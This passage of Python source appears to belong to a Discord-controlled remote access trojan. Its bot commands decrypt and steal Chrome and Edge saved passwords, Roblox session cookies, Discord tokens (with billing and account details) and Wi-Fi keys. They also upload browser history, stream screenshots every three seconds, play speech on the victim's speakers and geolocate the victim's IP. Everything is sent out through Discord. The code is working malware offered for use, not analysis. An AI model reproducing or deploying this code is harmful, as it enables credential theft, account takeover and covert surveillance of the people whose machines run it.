                key = base64.b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:]
                key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
            filename = "Cookies.db"
            if not os.path.isfile(filename):
                shutil.copyfile(db_path, filename)

            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("SELECT encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'")

            for encrypted_value, in cursor.fetchall():
                try:
                    iv = encrypted_value[3:15]
                    encrypted_value = encrypted_value[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    cookie = cipher.decrypt(encrypted_value)[:-16].decode()
                    break
                except:
                    continue

            cursor.close()
            db.close()
        except:
            pass

        # Try alternate browsers if primary method failed
        if not cookie:
            for browser_func in [
                lambda: browser_cookie3.firefox(domain_name='roblox.com'),
                lambda: browser_cookie3.chromium(domain_name='roblox.com'),
                lambda: browser_cookie3.edge(domain_name='roblox.com'),
                lambda: browser_cookie3.opera(domain_name='roblox.com'),
                lambda: browser_cookie3.chrome(domain_name='roblox.com')
            ]:
                try:
                    cookies = browser_func()
                    for c in cookies:
                        if c.name == '.ROBLOSECURITY':
                            cookie = c.value
                            break
                    if cookie:
                        break
                except:
                    continue

        if cookie:
            # Validate and refresh cookie if needed
            try:
                csrf_req = httpx.get("https://www.roblox.com/home", cookies={".ROBLOSECURITY": cookie})
                csrf_token = csrf_req.text.split("<meta name=\"csrf-token\" data-token=\"")[1].split("\" />")[0]
                
                headers = {
                    "Content-Type": "application/json",
                    "user-agent": "Roblox/WinInet",
                    "origin": "https://www.roblox.com",
                    "referer": "https://www.roblox.com/my/account",
                    "x-csrf-token": csrf_token
                }

                check = robloxpy.Utils.CheckCookie(cookie).lower()
                if check != "valid cookie":
                    req = httpx.post("https://auth.roblox.com/v1/authentication-ticket",
                                 headers=headers, cookies={".ROBLOSECURITY": cookie}, json={})
                    auth_ticket = req.headers.get("rbx-authentication-ticket")
                    
                    headers["RBXAuthenticationNegotiation"] = "1"
                    req1 = httpx.post("https://auth.roblox.com/v1/authentication-ticket/redeem",
                                  headers=headers, json={"authenticationTicket": auth_ticket})
                    cookie = re.search(".ROBLOSECURITY=(.*?);", req1.headers["set-cookie"]).group(1)

            except Exception as e:
                print(f"Cookie refresh error: {e}")

            try:
                # Get account info
                ip_address = requests.get('http://api.ipify.org').text
                info = json.loads(requests.get("https://www.roblox.com/mobileapi/userinfo", 
                                            cookies={".ROBLOSECURITY": cookie}).text)
                
                roblox_id = info["UserID"]
                username = info['UserName']
                robux = requests.get("https://economy.roblox.com/v1/user/currency",
                                   cookies={'.ROBLOSECURITY': cookie}).json()["robux"]
                premium = info['IsPremium']
                
                rap = robloxpy.User.External.GetRAP(roblox_id)
                friends = robloxpy.User.Friends.External.GetCount(roblox_id)
                age = robloxpy.User.External.GetAge(roblox_id)
                creation = robloxpy.User.External.CreationDate(roblox_id)
                
                # Get profile picture
                headshot = json.loads(requests.get(
                    f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={roblox_id}&size=420x420&format=Png&isCircular=false"
                ).text)["data"][0]["imageUrl"]

                # Create and send embeds
                result_embed = Embed(title="💸 +1 Result Account 🕯️", color=0x00FF00)
                result_embed.set_thumbnail(url=headshot)
                result_embed.description = f"[Rolimons](https://www.rolimons.com/player/{roblox_id}) | [Profile](https://web.roblox.com/users/{roblox_id}/profile)"
                
                fields = [
                    ("Username", username),
                    ("Robux Balance", robux),
                    ("Premium Status", premium),
                    ("Creation Date", creation),
                    ("RAP", rap),
                    ("Friends", friends),
                    ("Account Age", age),
                    ("IP Address", ip_address)
                ]
                
                for name, value in fields:
                    result_embed.add_field(name=name, value=f"```{value}```", inline=True)
                
                await msg.edit(embed=result_embed)
                
                cookie_embed = Embed(title=".ROBLOSECURITY", description=f"```{cookie}```", color=0x00FF00)
                await ctx.send(embed=cookie_embed)

            except Exception as e:
                error_embed = Embed(
                    title="❌ Error",
                    description=f"Error getting account info:\n```{str(e)}```",
                    color=0xFF0000
                )
                await msg.edit(embed=error_embed)
        else:
            no_cookies_embed = Embed(title="❌ No Cookies Found",
                                   description="Could not find any Roblox cookies in browsers.",
                                   color=0xFF0000)
            await msg.edit(embed=no_cookies_embed)
            
    except Exception as e:
        error_embed = Embed(title="❌ Error",
                          description=f"An error occurred:\n```{str(e)}```",
                          color=0xFF0000)
        await msg.edit(embed=error_embed)

@bot.command()
async def grabpass(ctx):
    """Grabs the saved passwords from Chrome and Edge browsers."""

    def convert_date(ft):
        utc = datetime.utcfromtimestamp(((10 * int(ft)) - file_name) / nanoseconds)
        return utc.strftime('%Y-%m-%d %H:%M:%S')

    def get_master_key():
        try:
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
                local_state = f.read()
        except: exit()
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password_edge(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher(master_key, iv)
            decrypted_pass = decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e: return "Edge < 80"

    def get_passwords_edge():
        master_key = get_master_key()
        login_db = os.path.join(os.getenv('USERPROFILE'), r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data')
        try: shutil.copy2(login_db, "Loginvault.db")
        except: print("Edge browser not detected!")
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            result = {}
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password_edge(encrypted_password, master_key)
                if username != "" or decrypted_password != "":
                    result[url] = [username, decrypted_password]
        except: pass

        cursor.close(); conn.close()
        try: os.remove("Loginvault.db")
        except Exception as e: print(e); pass

    def get_encryption_key():
        try:
            if not os.path.exists(os.path):
                return None
            with open(os.path, "r") as f:
                local_state = f.read()

            local_state = json.loads(local_state)

            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            try:
                return get_master_key()
            except: exit()

    def decrypt_password_chrome(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try: return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except: return ""

    def main():
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("SELECT url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")
        result = {}
        for row in cursor.fetchall():
            action_url = row[0]
            username = row[1]
            password = decrypt_password_chrome(row[2], key)
            if username or password:
                result[action_url] = [username, password]
            else: continue
        cursor.close(); db.close()
        try: os.remove(filename)
        except: pass
        return result

    def grab_passwords():
        global file_name, nanoseconds
        file_name, nanoseconds = 116444736000000000, 10000000
        result = {}
        try: result = main()
        except: time.sleep(1)

        try: 
            result2 = get_passwords_edge()
            for i in result2.keys():
                result[i] = result2[i]
        except: time.sleep(1)

        return result

    # Execute the function and collect passwords
    passwords = grab_passwords()

    # Prepare the text file content
    password_file_content = ""
    if passwords:
        for url, creds in passwords.items():
            password_file_content += f"URL: {url}\nUsername: {creds[0]}\nPassword: {creds[1]}\n\n"
    else:
        password_file_content = "No passwords were retrieved from the browsers.\n"

    # Save the passwords to a text file
    file_path = "grabbed_passwords.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(password_file_content)

    # Send the text file as an attachment
    with open(file_path, "rb") as file:
        await ctx.send("Here are the grabbed passwords:", file=discord.File(file, file_path))

    # Clean up the file after sending
    try:
        os.remove(file_path)
    except:
        pass

class grab_discord:
    def initialize(raw_data=None):
        return fetch_tokens().upload(raw_data)

class extract_tokens:
    def __init__(self) -> None:
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens, self.uids = [], []
        
        # Discord app paths
        self.discord_paths = {
            'Discord': self.roaming + '\\discord',
            'Discord Canary': self.roaming + '\\discordcanary',
            'Discord PTB': self.roaming + '\\discordptb',
            'Discord Development': self.roaming + '\\discorddevelopment'
        }
        
        # Browser paths
        self.browser_paths = {
            'Google Chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'Firefox': self.roaming + '\\Mozilla\\Firefox\\Profiles'
        }
        
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5'
        ]
        
        self.extract()

    def extract(self) -> None:
        # Extract from Discord apps
        for app_name, path in self.discord_paths.items():
            if not os.path.exists(path):
                continue
                
            local_state_path = path + '\\Local State'
            leveldb_path = path + '\\Local Storage\\leveldb'
            
            if not os.path.exists(leveldb_path):
                continue
                
            # Get tokens from leveldb files
            for file_name in os.listdir(leveldb_path):
                if not file_name.endswith(('.log', '.ldb')):
                    continue
                    
                try:
                    with open(os.path.join(leveldb_path, file_name), errors='ignore') as f:
                        for line in [x.strip() for x in f if x.strip()]:
                            # Check for encrypted tokens
                            for encrypted in re.findall(self.regexp_enc, line):
                                token = self.decrypt_val(
                                    base64.b64decode(encrypted.split('dQw4w9WgXcQ:')[1]),
                                    self.get_master_key(local_state_path)
                                )
                                if token and self.validate_token(token):
                                    self.add_token(token)
                                    
                            # Check for plain tokens
                            for token in re.findall(self.regexp, line):
                                if self.validate_token(token):
                                    self.add_token(token)
                except Exception:
                    pass
                    
        # Extract from browsers
        for browser_name, browser_path in self.browser_paths.items():
            if not os.path.exists(browser_path):
                continue
                
            # Handle Firefox separately
            if 'Firefox' in browser_name:
                self.grab_firefox_tokens(browser_path)
                continue
                
            # Handle Chromium-based browsers
            for profile in self.profiles:
                profile_path = os.path.join(browser_path, profile)
                if not os.path.exists(profile_path):
                    continue
                    
                local_state_path = os.path.join(browser_path, 'Local State')
                leveldb_path = os.path.join(profile_path, 'Local Storage', 'leveldb')
                
                if not os.path.exists(leveldb_path):
                    continue
                    
                try:
                    master_key = self.get_master_key(local_state_path)
                    
                    for file_name in os.listdir(leveldb_path):
                        if not file_name.endswith(('.log', '.ldb')):
                            continue
                            
                        with open(os.path.join(leveldb_path, file_name), errors='ignore') as f:
                            for line in [x.strip() for x in f if x.strip()]:
                                for encrypted in re.findall(self.regexp_enc, line):
                                    token = self.decrypt_val(
                                        base64.b64decode(encrypted.split('dQw4w9WgXcQ:')[1]),
                                        master_key
                                    )
                                    if token and self.validate_token(token):
                                        self.add_token(token)
                                        
                                for token in re.findall(self.regexp, line):
                                    if self.validate_token(token):
                                        self.add_token(token)
                except Exception:
                    pass

    def grab_firefox_tokens(self, firefox_path):
        try:
            for item in os.listdir(firefox_path):
                if not os.path.isdir(os.path.join(firefox_path, item)):
                    continue
                    
                storage_path = os.path.join(firefox_path, item, 'storage', 'default', 'https+++discord.com')
                if not os.path.exists(storage_path):
                    continue
                    
                with open(os.path.join(storage_path, 'ls', 'data.json'), 'r') as f:
                    data = json.load(f)
                    for key in data.keys():
                        for token in re.findall(self.regexp, str(data[key])):
                            if self.validate_token(token):
                                self.add_token(token)
        except Exception:
            pass

    def add_token(self, token):
        try:
            uid = requests.get(self.base_url, headers={'Authorization': token}).json().get('id')
            if uid and uid not in self.uids:
                self.tokens.append(token)
                self.uids.append(uid)
        except Exception:
            pass

    def validate_token(self, token: str) -> bool:
        try:
            r = requests.get(self.base_url, headers={'Authorization': token})
            return r.status_code == 200
        except Exception:
            return False

    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            return decrypted_pass[:-16].decode(errors="ignore")
        except Exception:
            return None

    def get_master_key(self, path: str) -> bytes:
        try:
            if not os.path.exists(path):
                return None
            with open(path, "r") as f:
                local_state = f.read()

            local_state = json.loads(local_state)

            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            return None

class fetch_tokens:
    def __init__(self):
        self.tokens = extract_tokens().tokens

    def upload(self, raw_data=None):
        if not self.tokens:
            return []
        final_to_return = []
        for token in self.tokens:
            try:
                # Get user data
                user = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()
                
                # Get billing info
                billing = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', 
                                    headers={'Authorization': token}).json()

                # Get gift inventory
                gifts = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', 
                                  headers={'Authorization': token}).json()

                # Get user guilds
                guilds = requests.get('https://discord.com/api/v9/users/@me/guilds', 
                                   headers={'Authorization': token}).json()

                # Basic user info
                username = f"{user.get('username')}#{user.get('discriminator')}"
                user_id = user.get('id')
                email = user.get('email') or "Not found"
                phone = user.get('phone') or "Not found"
                locale = user.get('locale', 'Not found')
                mfa_enabled = "✅" if user.get('mfa_enabled') else "❌"
                verified = "✅" if user.get('verified') else "❌"
                nitro_type = user.get('premium_type', 0)
                nitro = {0: "No Nitro", 1: "Nitro Classic", 2: "Nitro Boost", 3: "Nitro Basic"}[nitro_type]
                
                # Avatar and banner
                avatar = user.get('avatar')
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png" if avatar else "No avatar"
                banner = user.get('banner')
                banner_url = f"https://cdn.discordapp.com/banners/{user_id}/{banner}.png" if banner else "No banner"
                
                # Creation date
                created_at = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S')
                
                # Payment info
                payment_sources = len(billing)
                payment_types = []
                for source in billing:
                    if source.get('type') == 1:  # Credit card
                        payment_types.append("💳")
                    elif source.get('type') == 2:  # PayPal
                        payment_types.append("PayPal")
                payment_methods = ' '.join(payment_types) if payment_types else "None"
                
                # Gift codes
                gift_codes = len(gifts)
                
                # Guild info
                total_guilds = len(guilds)
                
                # Separate owned and admin servers
                owned_guilds = []
                admin_guilds = []
                
                for guild in guilds:
                    guild_name = guild.get('name')
                    guild_id = guild.get('id')
                    guild_info = f"{guild_name} ({guild_id})"
                    
                    # Check if user owns the server
                    if guild.get('owner'):
                        owned_guilds.append(guild_info)
                    
                    # Check if user has admin permissions
                    perms = int(guild.get('permissions', 0))
                    if perms & 0x8 and not guild.get('owner'):  # Admin but not owner
                        admin_guilds.append(guild_info)
                
                # Create embed
                embed = Embed(
                    title=f"Discord Token Info - {username}",
                    color=EMBED_COLOR
                )
                embed.set_thumbnail(url=avatar_url)
                if banner_url != "No banner":
                    embed.set_image(url=banner_url)
                
                # User Information
                embed.add_field(
                    name="👤 Account Info",
                    value=f"```md\n"
                          f"Email: {email}\n"
                          f"Phone: {phone}\n"
                          f"Locale: {locale}\n"
                          f"2FA/MFA: {mfa_enabled}\n"
                          f"Verified: {verified}\n"
                          f"Nitro: {nitro}\n"
                          f"Created: {created_at}\n```",
                    inline=True
                )
                
                # Token Information
                embed.add_field(
                    name="🔑 Token",
                    value=f"```{token}```",
                    inline=False
                )
                
                # Billing Information
                embed.add_field(
                    name="💰 Billing",
                    value=f"```md\n"
                          f"Payment Methods: {payment_methods}\n"
                          f"Payment Sources: {payment_sources}\n"
                          f"Gift Codes: {gift_codes}\n```",
                    inline=True
                )
                
                # Server Information
                embed.add_field(
                    name="🌐 Servers",
                    value=f"```md\n"
                          f"Total Servers: {total_guilds}\n"
                          f"Owned Servers: {len(owned_guilds)}\n"
                          f"Admin Servers: {len(admin_guilds)}\n```",
                    inline=True
                )
                
                # Owned Servers List
                if owned_guilds:
                    owned_list = "\n".join(owned_guilds[:5])
                    if len(owned_guilds) > 5:
                        owned_list += f"\nand {len(owned_guilds)-5} more..."
                    embed.add_field(
                        name="👑 Owned Servers",
                        value=f"```md\n{owned_list}```",
                        inline=False
                    )
                
                # Admin Servers List
                if admin_guilds:
                    admin_list = "\n".join(admin_guilds[:5])
                    if len(admin_guilds) > 5:
                        admin_list += f"\nand {len(admin_guilds)-5} more..."
                    embed.add_field(
                        name="⚡ Admin Servers",
                        value=f"```md\n{admin_list}```",
                        inline=False
                    )
                
                # Add to embeds list
                final_to_return.append(embed)
                
            except Exception as e:
                continue
                
        return final_to_return

@bot.command()
async def token(ctx):
    """Grab Discord tokens and detailed account information"""
    try:
        await ctx.send("🔍 Searching for Discord tokens...")
        fetched_data = fetch_tokens().upload()
        if fetched_data:
            await ctx.send(f"✅ Found {len(fetched_data)} valid token(s)!")
            for embed in fetched_data:
                await ctx.send(embed=embed)
        else:
            await ctx.send("❌ No tokens found.")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
async def grabwifi(ctx):
    """Grabs and displays all Wi-Fi passwords in a beautiful embed."""
    try:
        status_msg = await ctx.send("🔍 Searching for WiFi profiles...")
        
        # Get all WiFi profiles with better encoding handling
        data = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, encoding='utf-8', errors='ignore')
        if data.returncode != 0:
            await status_msg.edit(content="❌ Failed to retrieve WiFi profiles. Make sure WiFi is enabled.")
            return

        # More robust profile name extraction
        profiles = []
        for line in data.stdout.split('\n'):
            if "All User Profile" in line:
                profile = line.split(":")[1].strip()
                profiles.append(profile)

        if not profiles:
            await status_msg.edit(content="❌ No WiFi profiles found. Make sure you have connected to networks before.")
            return
            
        await status_msg.edit(content=f"✅ Found {len(profiles)} WiFi profile(s)! Retrieving passwords...")
        
        # Create a main embed for summary
        summary_embed = Embed(
            title="📡 WiFi Networks Found",
            description=f"Found {len(profiles)} saved WiFi networks",
            color=EMBED_COLOR
        )

        # Process each network
        networks_info = []
        for profile in profiles:
            try:
                # Get detailed profile info with better error handling
                profile_info = subprocess.run(
                    ['netsh', 'wlan', 'show', 'profile', f'name="{profile}"', 'key=clear'],
                    capture_output=True,
                    text=True,
                    encoding='utf-8',
                    errors='ignore'
                )
                
                if profile_info.returncode != 0:
                    continue

                # Extract information with more robust parsing
                auth = "Not Found"
                cipher = "Not Found"
                security_key = "Not Found"
                password = "Not Found"
                
                for line in profile_info.stdout.split('\n'):
                    if "Authentication" in line:
                        auth = line.split(':')[1].strip()
                    elif "Cipher" in line:
                        cipher = line.split(':')[1].strip()
                    elif "Security key" in line:
                        security_key = line.split(':')[1].strip()
                    elif "Key Content" in line:
                        password = line.split(':')[1].strip()
                
                # Store network info
                networks_info.append({
                    'name': profile,
                    'auth': auth,
                    'cipher': cipher,
                    'security': security_key,
                    'password': password
                })
                
            except Exception as e:
                continue
        
        # Sort networks by name
        networks_info.sort(key=lambda x: x['name'].lower())
        
        # Create embeds (Discord has a limit of 25 fields per embed)
        embeds = []
        current_embed = None
        field_count = 0
        
        for network in networks_info:
            if field_count == 0:
                current_embed = Embed(
                    title="🌐 WiFi Networks",
                    color=EMBED_COLOR
                )
                embeds.append(current_embed)
            
            # Create field content
            field_value = (
                f"```md\n"
                f"Authentication: {network['auth']}\n"
                f"Cipher: {network['cipher']}\n"
                f"Security Key: {network['security']}\n"
                f"Password: {network['password']}\n"
                f"```"
            )
            
            current_embed.add_field(
                name=f"📶 {network['name']}",
                value=field_value,
                inline=False
            )
            
            field_count = (field_count + 1) % 25
        
        # Add summary field to first embed
        if embeds:
            embeds[0].insert_field_at(
                0,
                name="📊 Summary",
                value=f"```md\nTotal Networks: {len(networks_info)}\nSecured Networks: {sum(1 for n in networks_info if n['security'] == 'Present')}\nOpen Networks: {sum(1 for n in networks_info if n['security'] == 'Absent')}```",
                inline=False
            )
        
        # Send all embeds
        await status_msg.delete()
        for embed in embeds:
            await ctx.send(embed=embed)
            
    except Exception as e:
        error_embed = Embed(title="❌ Error", description=f"```{str(e)}```", color=0xFF0000)
        await ctx.send(embed=error_embed)

# Global variable for screenshot task
screenshot_task = None
screenshot_task_running = False

async def take_screenshot():
    """Take a screenshot and return the file path"""
    try:
        # Create temp directory if it doesn't exist
        temp_dir = os.path.join(os.getenv('TEMP'), 'screenshots')
        os.makedirs(temp_dir, exist_ok=True)
        
        # Generate unique filename
        timestamp = int(time.time())
        temp_path = os.path.join(temp_dir, f'screenshot_{timestamp}.png')
        
        # Take screenshot using PIL
        screenshot = ImageGrab.grab()
        screenshot.save(temp_path)
        
        return temp_path
    except Exception as e:
        print(f"Screenshot error: {e}")
        return None

@bot.command()
async def ssrec(ctx):
    """
    Takes screenshots every 3 seconds and sends them to Discord.
    Use .ssrecstop to stop recording.
    """
    global screenshot_task_running
    global screenshot_task

    if screenshot_task_running:
        await ctx.send("🛑 Screenshot recording is already running!")
        return

    screenshot_task_running = True
    await ctx.send("📸 Starting screenshot recording (every 3 seconds). Use `.ssrecstop` to stop.")

    async def screenshot_loop():
        try:
            while screenshot_task_running:
                # Take screenshot
                screenshot_path = await take_screenshot()
                
                if screenshot_path and os.path.exists(screenshot_path):
                    try:
                        # Send to Discord
                        await ctx.send(file=discord.File(screenshot_path))
                        
                        # Clean up
                        try:
                            os.remove(screenshot_path)
                        except:
                            pass
                    except discord.errors.HTTPException:
                        await ctx.send("⚠️ Failed to send screenshot (file too large)")
                    except Exception as e:
                        await ctx.send(f"⚠️ Error sending screenshot: {str(e)}")
                
                # Wait 3 seconds
                await asyncio.sleep(3)
                
        except asyncio.CancelledError:
            pass
        except Exception as e:
            await ctx.send(f"❌ Screenshot loop error: {str(e)}")
        finally:
            # Final cleanup
            try:
                temp_dir = os.path.join(os.getenv('TEMP'), 'screenshots')
                if os.path.exists(temp_dir):
                    for file in os.listdir(temp_dir):
                        try:
                            os.remove(os.path.join(temp_dir, file))
                        except:
                            pass
                    try:
                        os.rmdir(temp_dir)
                    except:
                        pass
            except:
                pass

    try:
        # Start screenshot loop as task
        screenshot_task = asyncio.create_task(screenshot_loop())
    except Exception as e:
        screenshot_task_running = False
        await ctx.send(f"❌ Failed to start screenshot recording: {str(e)}")

@bot.command()
async def ssrecstop(ctx):
    """Stops the screenshot recording."""
    global screenshot_task_running
    global screenshot_task
    
    if not screenshot_task_running:
        await ctx.send("❌ Screenshot recording is not running!")
        return
    
    try:
        # Stop the screenshot loop
        screenshot_task_running = False
        
        if screenshot_task:
            screenshot_task.cancel()
            try:
                await screenshot_task
            except asyncio.CancelledError:
                pass
            
        await ctx.send("✅ Screenshot recording stopped.")
        
        # Clean up temp directory
        try:
            temp_dir = os.path.join(os.getenv('TEMP'), 'screenshots')
            if os.path.exists(temp_dir):
                for file in os.listdir(temp_dir):
                    try:
                        os.remove(os.path.join(temp_dir, file))
                    except:
                        pass
                try:
                    os.rmdir(temp_dir)
                except:
                    pass
        except:
            pass
            
    except Exception as e:
        await ctx.send(f"❌ Error stopping recording: {str(e)}")
    finally:
        screenshot_task_running = False
        screenshot_task = None

@bot.command()
async def tts(ctx, *, message: str):
    """Text to speech command that plays a message through the computer's speakers"""
    try:
        # Create a TTS audio file
        tts = gTTS(text=message, lang='en', slow=False)
        temp_dir = os.getenv('TEMP')
        audio_file = os.path.join(temp_dir, 'tts_audio.mp3')
        tts.save(audio_file)
        
        # Respond in Discord
        await ctx.send(f"🎙️ Playing the message: \"{message}\"")
        
        # Initialize pygame mixer if not already done
        if not pygame.mixer.get_init():
            pygame.mixer.init()
        
        # Load and play the audio
        pygame.mixer.music.load(audio_file)
        pygame.mixer.music.play()
        
        # Wait for playback to finish
        while pygame.mixer.music.get_busy():
            await asyncio.sleep(0.1)
            
        # Cleanup
        pygame.mixer.music.unload()
        try:
            os.remove(audio_file)
        except:
            pass
            
    except Exception as e:
        await ctx.send(f"❌ Failed to play TTS: {e}")

@bot.command()
async def grabhistory(ctx):
    """
    Grabs browser history from Chrome, Firefox, and Edge browsers and sends it as a text file.
    Requires sqlite3 to be installed.
    """
    try:
        history_data = []
        
        # Chrome History
        chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 
            'Google\\Chrome\\User Data\\Default\\History')
        
        # Edge History
        edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 
            'Microsoft\\Edge\\User Data\\Default\\History')
        
        # Function to extract history from SQLite database
        def extract_history(db_path):
            if not os.path.exists(db_path):
                return []
                
            # Create a copy of the database since it might be locked
            temp_path = os.path.join(tempfile.gettempdir(), 'temp_history')
            shutil.copy2(db_path, temp_path)
            
            entries = []
            try:
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT url, title, datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime') 
                    FROM urls ORDER BY last_visit_time DESC
                """)
                entries = cursor.fetchall()
                conn.close()
            except Exception as e:
                print(f"Error reading history: {str(e)}")
            finally:
                try:
                    os.remove(temp_path)
                except:
                    pass
            return entries

        # Get Chrome history
        chrome_history = extract_history(chrome_path)
        if chrome_history:
            history_data.append(("Chrome", chrome_history))

        # Get Edge history
        edge_history = extract_history(edge_path)
        if edge_history:
            history_data.append(("Edge", edge_history))

        if not history_data:
            await ctx.send("No browser history found or access denied.")
            return

        # Create a text file with all history
        history_file = os.path.join(os.getenv('TEMP'), 'browser_history.txt')
        with open(history_file, 'w', encoding='utf-8') as f:
            for browser_name, history in history_data:
                f.write(f"\n{'='*50}\n")
                f.write(f"{browser_name} Browser History\n")
                f.write(f"{'='*50}\n\n")
                
                for i, (url, title, timestamp) in enumerate(history, 1):
                    f.write(f"{i}. {title}\n")
                    f.write(f"URL: {url}\n")
                    f.write(f"Visited: {timestamp}\n")
                    f.write("-"*50 + "\n")

        # Send the file
        await ctx.send(file=discord.File(history_file))
        
        # Clean up the file after sending
        try:
            os.remove(history_file)
        except:
            pass

    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

@bot.command()
async def ip_info(ctx):
    """Get detailed IP information and location with Google Maps link"""
    try:
        await ctx.send("🔍 Gathering IP information...")

        # Get external IP
        ip = requests.get('https://api.ipify.org').text

        # Get detailed IP info from ip-api
        ip_data = requests.get(f'http://ip-api.com/json/{ip}').json()

        if ip_data['status'] == 'success':
            # Create Google Maps link
            maps_link = f"https://www.google.com/maps?q={ip_data['lat']},{ip_data['lon']}"
            
            # Create Street View link
            street_view = f"https://www.google.com/maps/@?api=1&map_action=pano&viewpoint={ip_data['lat']},{ip_data['lon']}"
            
            # Create detailed embed with pink color
            embed = Embed(
                title="🌍 IP Information",
                description=f"Detailed information for IP: `{ip}`",
                color=0xFFC0CB
            )

            # Set a cute thumbnail
            embed.set_thumbnail(url="https://i.imgur.com/QOE3q43.png")
            
            # Add IP info fields with cute emojis
            embed.add_field(
                name="🏡 Location",
                value=f"```{ip_data['city']}, {ip_data['regionName']}, {ip_data['country']} ({ip_data['countryCode']})```",
                inline=False
            )
            
            embed.add_field(
                name="🌸 ISP",
                value=f"```{ip_data['isp']}```",
                inline=False
            )
            
            embed.add_field(
                name="🏢 Organization",
                value=f"```{ip_data.get('org', 'N/A')}```",
                inline=False
            )
            
            embed.add_field(
                name="🎯 Coordinates",
                value=f"```Latitude: {ip_data['lat']}\nLongitude: {ip_data['lon']}```",
                inline=False
            )
            
            embed.add_field(
                name="🌺 Timezone",
                value=f"```{ip_data['timezone']}```",
                inline=False
            )
            
            # Add links with cute formatting
            embed.add_field(
                name="🗺️ View Location",
                value=f"[🌸 Google Maps]({maps_link})\n[🏡 Street View]({street_view})",
                inline=False
            )
            
            # Add network info
            if 'as' in ip_data:
                embed.add_field(
                    name="🎀 Network",
                    value=f"```{ip_data['as']}```",
                    inline=False
                )
            
            # Add mobile carrier if available
            if 'mobile' in ip_data and ip_data['mobile']:
                embed.add_field(
                    name="📱 Mobile Network",
                    value=f"```Yes (Mobile ISP)```",
                    inline=False
                )
            
            # Add proxy/VPN detection
            proxy_status = []
            if 'proxy' in ip_data and ip_data['proxy']:
                proxy_status.append("Proxy: Yes")
            if 'hosting' in ip_data and ip_data['hosting']:
                proxy_status.append("Hosting: Yes")
            
            if proxy_status:
                embed.add_field(
                    name="🎀 Connection Type",
                    value=f"```{', '.join(proxy_status)}```",
                    inline=False
                )
            
            # Add a cute footer
            embed.set_footer(text="✨ IP Information by Your Cute Bot ✨",
                           icon_url="https://i.imgur.com/WQukR35.png")
            
            await ctx.send(embed=embed)
            
            # Send additional location info with matching pink theme
            try:
                # Get more detailed location info from BigDataCloud
                detail_url = f"https://api.bigdatacloud.net/data/reverse-geocode-client?latitude={ip_data['lat']}&longitude={ip_data['lon']}"
                detail_data = requests.get(detail_url).json()

                if 'locality' in detail_data:
                    location_embed = discord.Embed(
